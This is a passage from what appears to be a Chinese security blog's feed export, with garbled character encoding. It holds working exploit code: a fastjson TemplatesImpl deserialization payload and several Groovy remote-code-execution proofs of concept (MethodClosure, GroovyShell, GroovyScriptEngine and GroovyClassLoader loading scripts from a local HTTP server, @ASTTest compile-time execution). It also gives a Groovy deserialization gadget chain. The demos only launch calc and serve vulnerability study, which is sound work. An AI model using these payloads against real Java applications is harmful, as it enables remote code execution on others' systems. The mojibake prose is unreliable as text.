class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">(String cls)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/TemplatesImpl_RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> Base64.encode(code1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœå‘ç°æ²¡ååº”ä¹Ÿæ²¡æŠ¥é”™</p><p>è°ƒè¯•è·Ÿè¿›å»å‘ç°TemplatesImplæ²¡èµ‹ä¸Šå€¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025121532025.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241025121532025.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241025121532025"></p><p>åœ¨æˆ‘çš„å¤šæ–¹è°ƒè¯•ä¸‹ï¼Œç»ˆäºå‘ç°ï¼Œfastjsonååºåˆ—åŒ–ä¸èƒ½è°ƒç”¨ç§æœ‰å’Œä¿æŠ¤setterè¿›è¡Œèµ‹å€¼ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013111602440.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013111602440.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰€ä»¥åªèƒ½ç”¨Feature.SupportNonPublicFieldç›´æ¥å¯¹å­—æ®µåå°„èµ‹å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Id_MINIMAL_Class_TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> readClassStr(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;&#125;,&#123;&#x27;@type&#x27;:&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_bytecodes&#x27;:[&#x27;&quot;</span>+exp+<span class="string">&quot;&#x27;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_name&#x27;:&#x27;test&#x27;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_tfactory&#x27;:&#123;&#125;&#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;$ref\&quot;:\&quot;$[1].outputProperties\&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        JSON.parse(jsonInput, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">(String cls)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/TemplatesImpl_RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> Base64.encode(code1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤è´´ç»ˆç»“</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Groovyæ¼æ´</title>
      <link href="/2024/10/21/groovy-lou-dong/"/>
      <url>/2024/10/21/groovy-lou-dong/</url>
      
        <content type="html"><![CDATA[<p>Groovy æ˜¯ä¸€ç§åŸºäº Java å¹³å°çš„é¢å‘å¯¹è±¡è¯­è¨€ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021110024567.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021110024567.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021110024567"></p><p>pom.xmlï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">          &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;</span><br><span class="line">          &lt;artifactId&gt;groovy-all&lt;/artifactId&gt;</span><br><span class="line">          &lt;version&gt;<span class="number">2.4</span><span class="number">.15</span>&lt;/version&gt;</span><br><span class="line">      &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>groovyä¹Ÿæœ‰è‡ªå·±çš„ä»£ç æ‰§è¡Œ</p><p><code>Runtime.getRuntime().exec(&quot;calc&quot;)</code>ç­‰ä»·äº<code>&quot;calc&quot;.execute()</code></p><h2 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h2><p>callæ‰§è¡ŒdoCall</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021110235628.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021110235628.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021110235628"></p><p>å—ä¿æŠ¤æ–¹æ³•doCallåå°„æ‰§è¡Œå‘½ä»¤</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021110247928.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021110247928.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021110247928"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        MethodClosure mc = new MethodClosure(Runtime.getRuntime(), &quot;exec&quot;);</span></span><br><span class="line"><span class="comment">//        mc.call(&quot;calc&quot;);</span></span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">mc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;calc&quot;</span>,<span class="string">&quot;execute&quot;</span>);</span><br><span class="line">        mc.call();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="GroovyShell"><a href="#GroovyShell" class="headerlink" title="GroovyShell"></a>GroovyShell</h2><p>GroovyShellæœ‰ä¸¤ç§æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼</p><ul><li>evaluate</li><li>parse-&gt;run</li></ul><p>evaluateå­˜åœ¨å¤šä¸ªé‡è½½ï¼Œæ”¯æŒä»GroovyCodeSource,String,File,URI,Readeræ‰§è¡Œä»£ç </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021112621472.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021112621472.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021112621472"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021112819508.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021112819508.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021112819508"></p><p>File,URI,å’ŒäºŒæ¬¡å°è£…çš„GroovyCodeSourceæ‡’å¾—å†™äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">GroovyShell</span> <span class="variable">shell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;&#x27;calc&#x27;.execute()&quot;</span>;</span><br><span class="line"><span class="comment">//        shell.evaluate(content);//String evaluate</span></span><br><span class="line">        shell.evaluate(<span class="keyword">new</span> <span class="title class_">StringReader</span>(content));<span class="comment">//Reader evaluate</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="GroovyScriptEngine"><a href="#GroovyScriptEngine" class="headerlink" title="GroovyScriptEngine"></a>GroovyScriptEngine</h2><p>GroovyScriptEngineæ”¯æŒä»URLè·å–groovyè„šæœ¬</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021181229802.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021181229802.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021181229802"></p><p>runæ–¹æ³•å¦‚ä¸‹ï¼Œä¼ å…¥è„šæœ¬åå’Œæ‰§è¡Œè„šæœ¬æ‰€å¸¦çš„å‚æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021181723299.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021181723299.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021181723299"></p><p>ä¼šå…ˆè°ƒç”¨loadScriptByNameä»URL&#x2F;String&#x2F;Resourceè·å–groovyè„šæœ¬</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021180737550.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021180737550.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021180737550"></p><p>å¹¶æ‰§è¡Œè„šæœ¬</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021180645476.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021180645476.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021180645476"></p><p>å…·ä½“åŸç†ä¸ç”¨æ·±ç©¶ï¼Œçœ‹ä¸‹ç”¨æ³•ï¼š</p><p>Evil.groovyç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    Evil() &#123;</span><br><span class="line">        <span class="string">&quot;calc&quot;</span>.execute()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚æŒ‡å®šç³»ç»ŸClassLoaderå»æ‰§è¡ŒEvil.groovyç±»ï¼Œæ— éœ€ç¼–è¯‘ï¼Œrunæ—¶ä¼šè‡ªåŠ¨ç¼–è¯‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">groovyScriptEngine</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">GroovyScriptEngine</span> <span class="variable">gse</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEngine</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:8888&quot;</span>)&#125;,ClassLoader.getSystemClassLoader());</span><br><span class="line">        gse.run(<span class="string">&quot;Evil.groovy&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="GroovyScriptEvaluator"><a href="#GroovyScriptEvaluator" class="headerlink" title="GroovyScriptEvaluator"></a>GroovyScriptEvaluator</h2><p>GroovyScriptEvaluator.evaluateè°ƒç”¨GroovyShell.evaluate</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021183009000.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021183009000.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021183009000"></p><p>å¥—å¨ƒï¼Œå°±æ˜¯ä¿®æ”¹äº†æ¥æ”¶å‚æ•°ä¸ºScriptSourceå­ç±»ï¼Œç”¨ResourceScriptSourceæ‰èƒ½æ¥æ”¶URL</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021183218869.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021183218869.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021183218869"></p><p>payloadï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ublic <span class="keyword">class</span> <span class="title class_">groovyScriptEvaluator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">UrlResource</span> <span class="variable">urlResource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlResource</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:8888/Evil.groovy&quot;</span>));</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">GroovyScriptEvaluator</span>().evaluate(<span class="keyword">new</span> <span class="title class_">ResourceScriptSource</span>(urlResource));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="GroovyClassLoader"><a href="#GroovyClassLoader" class="headerlink" title="GroovyClassLoader"></a>GroovyClassLoader</h2><p>æœ‰loadClasså’ŒdefineClass</p><p>GroovyClassLoader.parseClassæ”¯æŒä»Fileï¼Œå­—ç¬¦ä¸²åŠ è½½groovyç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021190409940.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021190409940.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021190409940"></p><p>ä»ä»£ç ä¸Šæ¥çœ‹ï¼ŒparseClassæ˜¯èµ°äº†ä¸€ä¸ªåŒäº²å§”æ´¾çš„è¿‡ç¨‹ã€‚definePackage æ–¹æ³•è™½ç„¶æ²¡æœ‰æ˜¾å¼è°ƒç”¨çˆ¶ç±»åŠ è½½å™¨çš„æ–¹æ³•ï¼Œä½†åœ¨ç±»åŠ è½½è¿‡ç¨‹ä¸­ä¼šéµå¾ªåŒäº²å§”æ´¾æœºåˆ¶</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021191507702.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021191507702.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241021191507702"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">GroovyClassLoader</span> <span class="variable">gcl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyClassLoader</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> gcl.parseClass(<span class="string">&quot;class Evil &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    static &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        \&quot;calc\&quot;.execute()\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    clazz.newInstance();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯æƒœéœ€è¦å®ä¾‹åŒ–ï¼Œå•çº¯defineClasså¹¶æ²¡æœ‰ä»€ä¹ˆç”¨</p><p>ä¸è¿‡åœ¨Groovyä¸­ï¼ŒåªåŠ è½½ä¸åˆå§‹åŒ–ä¹Ÿæ˜¯æœ‰åŠæ³•RCEçš„</p><h3 id="ASTæ³¨è§£"><a href="#ASTæ³¨è§£" class="headerlink" title="ASTæ³¨è§£"></a>ASTæ³¨è§£</h3><p>ASTï¼ˆAbstract Syntax Treeï¼ŒæŠ½è±¡è¯­æ³•æ ‘ï¼‰æ³¨è§£æ˜¯ Groovy æä¾›çš„ä¸€ç§å…ƒç¼–ç¨‹å·¥å…·ï¼Œå®ƒå…è®¸ä½ åœ¨ç¼–è¯‘æ—¶å¯¹ä»£ç è¿›è¡Œä¿®æ”¹æˆ–å¢å¼ºã€‚è¿™äº›æ³¨è§£åœ¨ç¼–è¯‘é˜¶æ®µè¢« Groovy ç¼–è¯‘å™¨è¯†åˆ«å¹¶æ‰§è¡Œï¼Œå› æ­¤å¯ä»¥åœ¨ç¼–è¯‘æ—¶å¯¹ä»£ç è¿›è¡Œé™æ€æ£€æŸ¥ã€ä»£ç ç”Ÿæˆæˆ–ä»£ç è½¬æ¢ç­‰æ“ä½œã€‚<code>@groovy.transform.ASTTest</code> æ³¨è§£å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„ä¾‹å­ï¼Œå®ƒåœ¨ç¼–è¯‘æ—¶æ‰§è¡ŒæŒ‡å®šçš„é—­åŒ…ï¼Œç”¨äºæµ‹è¯•æˆ–éªŒè¯ä»£ç çš„æŸäº›ç‰¹æ€§</p><p>ASTæ³¨è§£çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ASTTransformationClass</span>(value=<span class="string">&quot;fully.qualified.name.of.TransformationClass&quot;</span>)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ@ASTTransformationClass æ˜¯ Groovy æä¾›çš„ä¸€ä¸ªå…ƒæ³¨è§£ï¼Œç”¨äºæŒ‡å®šä¸€ä¸ªå®ç°äº† org.codehaus.groovy.transform.ASTTransformation æ¥å£çš„ç±»ã€‚è¿™ä¸ªç±»åœ¨ç¼–è¯‘æ—¶ä¼šè¢«è°ƒç”¨ï¼Œå¯¹æ ‡æ³¨äº†è¯¥æ³¨è§£çš„ä»£ç è¿›è¡Œå¤„ç†ã€‚</p><p>å¸¸è§çš„ASTæ³¨è§£ï¼š</p><p>@CompileStaticï¼šå¯ç”¨é™æ€ç±»å‹æ£€æŸ¥ï¼Œæé«˜æ€§èƒ½ã€‚<br>@Delegateï¼šå°†æ–¹æ³•å§”æ‰˜ç»™å¦ä¸€ä¸ªå¯¹è±¡ã€‚<br>@Canonicalï¼šè‡ªåŠ¨ç”Ÿæˆæ„é€ å‡½æ•°ã€equalsã€hashCode å’Œ toString æ–¹æ³•ã€‚<br>@TupleConstructorï¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåŒ…å«æ‰€æœ‰å±æ€§çš„æ„é€ å‡½æ•°ã€‚<br>@ASTTestï¼šåœ¨ç¼–è¯‘æ—¶æ‰§è¡ŒæŒ‡å®šçš„é—­åŒ…ï¼Œç”¨äºæµ‹è¯•æˆ–éªŒè¯ä»£ç ã€‚</p><p>åˆ©ç”¨ASTTestå¯ä»¥åœ¨ç¼–è¯‘æ—¶å°±æ‰§è¡Œä»£ç ï¼Œä»è€ŒRCE</p><p>æ¯”å¦‚ï¼Œæˆ‘æŒ‡å®šä¸‹é¢çš„Evil.groovy</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@groovy</span>.transform.ASTTest(value=&#123;<span class="keyword">assert</span> Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>)&#125;)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">groovyClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">GroovyClassLoader</span> <span class="variable">gcl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyClassLoader</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> gcl.parseClass(<span class="string">&quot;@groovy.transform.ASTTest(value=&#123;assert Runtime.getRuntime().exec(\&quot;calc\&quot;)&#125;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;class Person&#123;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨addClasspath+loadClassè¿˜å¯ä»¥æ‰‹åŠ¨åŠ è½½httpè¿œç¨‹groovyç±»</p><p>addClasspathè°ƒç”¨addURL-&gt;URLClassLoader.addURLæŠŠURLåŠ å…¥äº†ucpï¼Œç†Ÿæ‚‰çš„å·²ç»æƒ³åˆ°ucpæ˜¯ç±»åŠ è½½çš„è·¯å¾„äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028212518220.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028212518220.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241028212518220"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028212546569.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028212546569.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241028212546569"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028212608817.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028212608817.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241028212608817"></p><p>loadClassä¼šä»ucpå¯»æ‰¾è¯¥ç±»</p><p>å¤ç°ï¼š</p><p>å»ºä¸€ä¸ªæ¶æ„groovyç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028212829041.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241028212829041.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241028212829041"></p><p>åœ¨è¯¥ç›®å½•ä¸‹å¼€httpæœåŠ¡ï¼Œå¹¶ç”¨GroovyClassLoaderåŠ è½½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">groovyClassLoader_URL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">GroovyClassLoader</span> <span class="variable">gcl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyClassLoader</span>();</span><br><span class="line">        gcl.addClasspath(<span class="string">&quot;http://127.0.0.1:8888/&quot;</span>);</span><br><span class="line">        gcl.loadClass(<span class="string">&quot;groovy_RuntimeEvil&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Groovyæ²™ç®±"><a href="#Groovyæ²™ç®±" class="headerlink" title="Groovyæ²™ç®±"></a>Groovyæ²™ç®±</h2><p>maybeæ²™ç®±ä¼šé™åˆ¶evaluate callè¿™äº›å‡½æ•°æ‰§è¡Œç‚¹</p><p>@ASTå’Œ@Grabå¯èƒ½ä¼šç»•è¿‡è¿‡æ»¤ï¼Œé‡åˆ°äº†è¯•ä¸€ä¸‹å§ï¼Œåº•å±‚nativeçš„ä¸œè¥¿æˆ‘ä¹Ÿä¸ä¼šåˆ†æ</p><h2 id="Groovyååºåˆ—åŒ–"><a href="#Groovyååºåˆ—åŒ–" class="headerlink" title="Groovyååºåˆ—åŒ–"></a>Groovyååºåˆ—åŒ–</h2><p><strong>Groovy : 1.7.0-2.4.3</strong></p><p>æ”¹ä¸‹ä¾èµ–åˆ°æ¼æ´ç‰ˆæœ¬ï¼Œåˆ©ç”¨é“¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">    Map.entrySet() (Proxy)</span><br><span class="line">        ConversionHandler.invoke()</span><br><span class="line">            ConvertedClosure.invokeCustom()</span><br><span class="line">                MethodClosure.call()</span><br><span class="line">                    ProcessGroovyMethods.execute()</span><br></pre></td></tr></table></figure><p>ConvertedClosure.invokeCustomè°ƒç”¨äº†callæ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241021203132817.png" class="lazyload placeholder" 